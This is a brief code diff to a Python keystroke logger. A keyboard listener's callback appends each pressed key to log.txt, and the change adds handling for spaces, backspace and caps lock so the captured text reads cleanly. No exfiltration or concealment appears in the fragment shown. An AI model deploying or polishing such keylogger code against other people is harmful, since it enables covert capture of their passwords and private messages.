@@ -20,8 +20,13 @@ def on_press(key):
     with open("log.txt", "a") as f:
         if key in alf:
             f.write(key)
+        elif key == "Key.space":
+            f.write(" ")
+        elif key == "Key.backspace" or key == "Key.caps_lock":
+            pass
         else:
             f.write("\n" + key + "\n")
+
 
 with Listener(on_press=on_press) as listener:
     listener.join()
